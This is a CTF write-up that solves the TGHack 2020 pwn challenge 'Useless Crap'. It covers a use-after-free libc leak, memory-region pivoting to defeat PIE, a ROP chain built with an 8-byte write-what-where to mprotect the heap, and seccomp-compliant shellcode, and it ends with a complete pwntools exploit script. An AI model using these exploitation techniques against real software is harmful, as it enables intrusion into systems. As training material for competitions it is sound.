### TGHack 2020 Useless Crap Writeup

TGHack 2020 honestly had really amazing problems, and the hard pwn  challenge Useless Crap was one of them. It showed me how to pivot  through all different memory regions (program base, heap, stack, libc,  ld) based on only one leak and I solved the rest by carefully building a rop chain with the 8 byte write-what-where.



Reversing the binary shows us several things; before the menu, a  sigalarm is initiated and a seccomp filter is built using functions like seccomp_init(), seccomp_rule_add(), seccomp_load(), and  seccomp_release(). Since sigalarm is annoying, I usually use the  following [program](https://gist.github.com/BitsByWill/cf766d3e1134644a02e04bf0fabf5f18) to run and debug the binary so I can ignore it. As for the seccomp  related functions, those are nice because it helps initialize the heap  and free some chunks accordingly before we even do anything. Here are  the seccomp rules: 


```c
 0000: 0x20 0x00 0x00 0x00000004 A = arch
 0001: 0x15 0x00 0x12 0xc000003e if (A != ARCH_X86_64) goto 0020
 0002: 0x20 0x00 0x00 0x00000000 A = sys_number
 0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0f 0xffffffff if (A != 0xffffffff) goto 0020
 0005: 0x15 0x0d 0x00 0x00000002 if (A == open) goto 0019
 0006: 0x15 0x0c 0x00 0x00000003 if (A == close) goto 0019
 0007: 0x15 0x0b 0x00 0x0000000a if (A == mprotect) goto 0019
 0008: 0x15 0x0a 0x00 0x000000e7 if (A == exit_group) goto 0019
 0009: 0x15 0x00 0x04 0x00000000 if (A != read) goto 0014
 0010: 0x20 0x00 0x00 0x00000014 A = fd >> 32 # read(fd, buf, count)
 0011: 0x15 0x00 0x08 0x00000000 if (A != 0x0) goto 0020
 0012: 0x20 0x00 0x00 0x00000010 A = fd # read(fd, buf, count)
 0013: 0x15 0x05 0x06 0x00000000 if (A == 0x0) goto 0019 else goto 0020
 0014: 0x15 0x00 0x05 0x00000001 if (A != write) goto 0020
 0015: 0x20 0x00 0x00 0x00000014 A = fd >> 32 # write(fd, buf, count)
 0016: 0x15 0x00 0x03 0x00000000 if (A != 0x0) goto 0020
 0017: 0x20 0x00 0x00 0x00000010 A = fd # write(fd, buf, count)
 0018: 0x15 0x00 0x01 0x00000001 if (A != 0x1) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000 return ALLOW
 0020: 0x06 0x00 0x00 0x00000000 return KILL
```

 So only open, close, mprotect, exit is allowed by any conditions. Read  is only allowed if fd equals 0 and write is only allowed if fd equals 1.

 Now for the main parts of the binary. do_read() and do_write() allow for an arbitrary 8 byte read and write respectively.


```c
 .bss:0000000000202030 read_count   dd ?          ; DATA XREF: do_read+17↑r
 .bss:0000000000202030                     ; do_read+81↑r ...
 .bss:0000000000202034 write_count   dd ?          ; DATA XREF: do_write+17↑r
 .bss:0000000000202034                     ; do_write+70↑r ...
 unsigned __int64 do_write()
 {
  _QWORD *v1; // [rsp+8h] [rbp-18h]
  __int64 v2; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
 
  v3 = __readfsqword(0x28u);
  if ( write_count <= 1 )
  {
   printf("addr/value: ");
   __isoc99_scanf("%lx %lx", &v1);
   empty_newline("%lx %lx", &v1);
   *v1 = v2;
   ++write_count;
  }
  else
  {
   puts("No more writes for you!");
  }
  return __readfsqword(0x28u) ^ v3;
 }
 
 unsigned __int64 do_read()
 {
  __int64 *v1; // [rsp+8h] [rbp-18h]
  __int64 v2; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
 
  v3 = __readfsqword(0x28u);
  if ( read_count <= 1 )
  {
   printf("addr: ");
   __isoc99_scanf("%lx", &v1);
   empty_newline();
   v2 = *v1;
   printf("value: %p\n", v2);
   ++read_count;
  }
  else
  {
   puts("No more reads for you!");
  }
  return __readfsqword(0x28u) ^ v3;
 }
```

 Unfortunately, we only get one read or write, but this can be easily bypassed later on.

 There are also two heap related functions: leave_feedback() and view_feedback().


```c
 .bss:0000000000202038 feedback    dq ?          ; DATA XREF: leave_feedback+8↑r
 .bss:0000000000202038                     ; leave_feedback+34↑w ...int view_feedback()
 {
  int result; // eax
 
  if ( feedback )
   result = printf("feedback: %s\n", feedback);
  else
   result = puts("Leave feedback first!");
  return result;
 }
 
 void leave_feedback()
 {
  char *v0; // rsi
  char v1; // [rsp+Fh] [rbp-1h]
 
  if ( feedback )
  {
   puts("that's enough feedback for one day...");
  }
  else
  {
   feedback = (char *)calloc(1uLL, 0x501uLL);
   printf("feedback: ", 1281LL);
   if ( !fgets(feedback, 1280, stdin) )
    exit(1);
   v0 = feedback;
   printf("you entered: %s\n", feedback);
   puts("Do you want to keep your feedback? (y/n)");
   v1 = getchar();
   empty_newline("Do you want to keep your feedback? (y/n)", v0);
   if ( v1 != 121 && v1 == 110 ) //not necessarily freed
    free(feedback);
  }
 }
```

 Basically, leave_feedback lets you write into a calloc'd chunk that is  too large for tcache (so it will go into unsorted when freed). It also  doesn't zero out the pointer, allowing for a UAF (if you choose to free  it) you can exploit with view_feedback. However, this non-zeroing out  is also an issue as the function that creates allocations only runs if  the pointer is uninitialized.

 Now we can begin exploitation. The creator PewZ is very nice to have  given us debug symbols for everything. One thing to note here is that  you should place the libs based on what the binary shows with the file  command. Performing a patchelf in this case created some erroneous  offsets related to binary base.

 I began with some of my helper functions:


```python
 p = remote("crap.tghack.no", 6001)
 
 def wait():
 p.recvrepeat(0.3)
 
 def view(address):
 p.sendline('1')
 wait()
 p.sendline(hex(address))
 
 def write(address, value):
 p.sendline('2')
 wait()
 p.sendline(hex(address) + ' ' + value)
 wait()
 
 def viewf():
 p.sendline('4')
 
 def writef(data, freestuff):
 p.sendline('3')
 wait()
 p.sendline(data)
 wait()
 p.sendline(freestuff)
 wait()
```

 Getting a libc leak is trivial. Allocate a chunk, and then free it. We can get a libc address from the main arena leak there. It won't merge  with top since all the seccomp initialization functions left chunks  above and below on the heap. Now, we definitely need a PIE leak because there is no possible way to pwn this with only one read and one write  remaining. Doing some research, I discover this amazing [post](https://nickgregory.me/security/2019/04/06/pivoting-around-memory/) that shows us all the possible ways to pivot through memory on linux processes.

 Basically, since libc and ld are usually the first few libraries loaded  and due to the way mmap works, libc and ld are almost guaranteed to be  at constant offsets relative to one another. Using the calculated ld  base, we can read _dl_rtld_libname of ld, which holds a pointer in the  .interp section of the binary, thereby leaking PIE. However, no matter  how carefully I set my debugging system to be like the remote one (I  even checked with the creator), my libs loaded weirdly in which after  libc is loaded, part of ld gets loaded, then the entire libseccomp gets  loaded, and then the rest of ld is loaded. This creates issues because  as in the case on remote, all of ld should load together after  libseccomp loads.

 But this discrepancy is easy to fix with everyone's favorite solution:  bruteforcing! We can basically estimate where ld should be loaded if it is loaded only after libseccomp by looking at a few vmmaps and counting the number of memory regions before where ld should be at. Using this  offset as a rough estimate, we can start adding or subtracting 0x1000  since we know ld base will be page aligned. Eventually, the remote  process stopped segfaulting and started to display nulls, and finally, a PIE address came out. Very few people encountered this issue which I  faced. The following snippet goes up to the PIE leak.


```python
 writef('test', 'n')
 viewf()
 temp = p.recvline()
 libcleak = u64(temp.split(': ')[1].split('\n')[0].ljust(8, '\x00'))
 libc.address = libcleak - 0x3b5be0
 log.info("main arena leak: " + hex(libcleak))
 log.info("libc base: " + hex(libc.address))
 ld.address = 6250496+(0x1000*12)+libc.address
 log.info("ld base: " + hex(ld.address))
 view(ld.symbols['_dl_rtld_libname'])
 temp = p.recvline()
 pieleak= int(temp.split(': ')[1].split('\n')[0], 16)
 bin.address = pieleak - 2109440 + 2108872
 log.info("pie base: " + hex(bin.address))
```

 After leaking PIE base, we can do one write to overwrite the read and  write values so we get practically a lot of them. Read and write values are both signed ints within the same 8 byte block, so we can use write  to make both of them a somewhat large negative number.


```python
 write(bin.address + 0x202030, "0xffffffa8ffffffa8")
```

 Now, with a ton of reads, we can trivially leak heap addresses with a  main arena address and trivially leak the stack address with environ. I also used the write to zero out the feedback pointer to make another  allocation for shellcoding purposes (we could also do this with the  first allocation originally).


```python
 view(libcleak)
 temp = p.recvline()
 heapleak = int(temp.split(': ')[1].split('\n')[0], 16)
 log.info("heap leak: " + hex(heapleak))
 view(libc.symbols['environ'])
 temp = p.recvline()
 stackleak = int(temp.split(': ')[1].split('\n')[0], 16)
 log.info("stack leak: " + hex(stackleak))
 write(bin.address+0x202038, "0x0")
```

 Now with all the leaks, we can begin doing the final part of the  exploit. Due to seccomp rules, we can only do a open read write RCE. I did this via shellcoding on the heap, so my first goal was to use  mprotect to make the heap executable. I did this part differently from  the [author's solution](https://github.com/tghack/tg20hack/blob/master/pwn/useless_crap/writeup.md), in which he used a file structure attack to help him lead into setcontext, which will allow him to do a stack pivot.

 I briefly thought about file structure, but since I'm not very good at  it, I decided to look for other solutions. One idea I had was to write  the ROP chain with do_write() 8 bytes at a time, slowly writing down to  the return address of do_write(). I never did this before, but  conceptually, it sounded fine as long as not too much writing activity  is happening on the stack near that region. In fact, only one address  that was part of the ROP chain was overwritten when I returned back to  the caller of do_write(), so I readjusted my ROP chain to ignore the  content there (which went into the r15 register during the ROP).  Generally, the stack address holding the return of the do_write()  function should remain the same in terms of its offset to the stack  address leaked by environ; the stored return address can be found with  the info frame command. The following snippet shows this part (note  that I placed the shellcode on the heap before this part of the code,  but I will explain the shellcode part afterwards).


```python
 targetreturn = stackleak - 288
 log.info("general target to overwrite: " + hex(targetreturn))
 \#libc gadgets
 poprdi = libc.address + 0x0000000000021882 #: pop rdi; ret;
 poprsi = libc.address + 0x0000000000022192 #: pop rsi; ret;
 poprdx = libc.address + 0x0000000000001b9a #: pop rdx; ret;
 poprsir15 = libc.address + 0x0000000000021880 #: pop rsi; pop r15; ret;
 targetheap = heapleak-4704
 write(targetreturn+64, hex(targetheap))
 write(targetreturn+56, hex(libc.symbols['mprotect']))
 write(targetreturn+48, hex(7))
 write(targetreturn+40, hex(poprdx))
 write(targetreturn+32, hex((heapleak-0x2000)>>12<<12))
 write(targetreturn+24, hex(poprdi))
 write(targetreturn+16, "0xdeadbabe")
 write(targetreturn+8, "0x12000")
 write(targetreturn, hex(poprsir15))
```

 As for the shellcode, we have to follow the seccomp rules. Since you  can only read from stdin, I had to close stdin (we don't need it anymore once we hit the shellcode), open the flag file (which will be opened at fd 0 now), and then read from that location. Then we just write it out to stdout.


```python
 s64 = shellcraft.amd64.close(0)
 s64 += shellcraft.amd64.open('flag.txt')
 s64 += shellcraft.amd64.linux.syscall("SYS_read", 0, "rsp", 0xff) #cause you can only read from fd 0
 s64 += shellcraft.amd64.linux.syscall("SYS_write", 1, "rsp", 0x20)
 s64 += shellcraft.amd64.linux.syscall("SYS_exit_group", 0)
 shellcode = asm(s64)
 writef(shellcode, 'y')
```

 I didn't parse out the output as I just set pwntools to debug context and saw the flag. Here is my final exploit:


```python
 from pwn import *

 bin = ELF('./crap')
 ld = ELF('./ld-2.31.so')
 libc = ELF('./libc.so.6')
 context(arch='amd64')

 p = remote("crap.tghack.no", 6001)

 def wait():
 p.recvrepeat(0.3)

 def view(address):
 p.sendline('1')
 wait()
 p.sendline(hex(address))

 def write(address, value):
 p.sendline('2')
 wait()
 p.sendline(hex(address) + ' ' + value)
 wait()

 def viewf():
 p.sendline('4')

 def writef(data, freestuff):
 p.sendline('3')
 wait()
 p.sendline(data)
 wait()
 p.sendline(freestuff)
 wait()

 writef('test', 'n')
 viewf()
 temp = p.recvline()
 libcleak = u64(temp.split(': ')[1].split('\n')[0].ljust(8, '\x00'))
 libc.address = libcleak - 0x3b5be0
 log.info("main arena leak: " + hex(libcleak))
 log.info("libc base: " + hex(libc.address))
 ld.address = 6250496+(0x1000*12)+libc.address
 log.info("ld base: " + hex(ld.address))
 view(ld.symbols['_dl_rtld_libname'])
 temp = p.recvline()
 pieleak= int(temp.split(': ')[1].split('\n')[0], 16)
 bin.address = pieleak - 2109440 + 2108872
 log.info("pie base: " + hex(bin.address))
 write(bin.address + 0x202030, "0xffffffa8ffffffa8")
 view(libcleak)
 temp = p.recvline()
 heapleak = int(temp.split(': ')[1].split('\n')[0], 16)
 log.info("heap leak: " + hex(heapleak))
 view(libc.symbols['environ'])
 temp = p.recvline()
 stackleak = int(temp.split(': ')[1].split('\n')[0], 16)
 log.info("stack leak: " + hex(stackleak))

 write(bin.address+0x202038, "0x0")


 s64 = shellcraft.amd64.close(0)
 s64 += shellcraft.amd64.open('flag.txt')
 s64 += shellcraft.amd64.linux.syscall("SYS_read", 0, "rsp", 0xff)
 s64 += shellcraft.amd64.linux.syscall("SYS_write", 1, "rsp", 0x50)
 s64 += shellcraft.amd64.linux.syscall("SYS_exit_group", 0)
 shellcode = asm(s64)

 writef(shellcode, 'y')
 targetreturn = stackleak - 288
 log.info("general target to overwrite: " + hex(targetreturn))
 \#libc gadgets
 poprdi = libc.address + 0x0000000000021882 #: pop rdi; ret;
 poprsi = libc.address + 0x0000000000022192 #: pop rsi; ret;
 poprdx = libc.address + 0x0000000000001b9a #: pop rdx; ret;
 poprsir15 = libc.address + 0x0000000000021880 #: pop rsi; pop r15; ret;

 targetheap = heapleak-4704
 write(targetreturn+64, hex(targetheap))
 write(targetreturn+56, hex(libc.symbols['mprotect']))
 write(targetreturn+48, hex(7))
 write(targetreturn+40, hex(poprdx))
 write(targetreturn+32, hex((heapleak-0x2000)>>12<<12))
 write(targetreturn+24, hex(poprdi))
 write(targetreturn+16, "0xdeadbabe")
 write(targetreturn+8, "0x12000")
 context.log_level = 'debug'
 write(targetreturn, hex(poprsir15))
 p.close()
```




Overall, this challenge was very fun. The author PewZ did a great job, just like all of his other problems in this CTF. 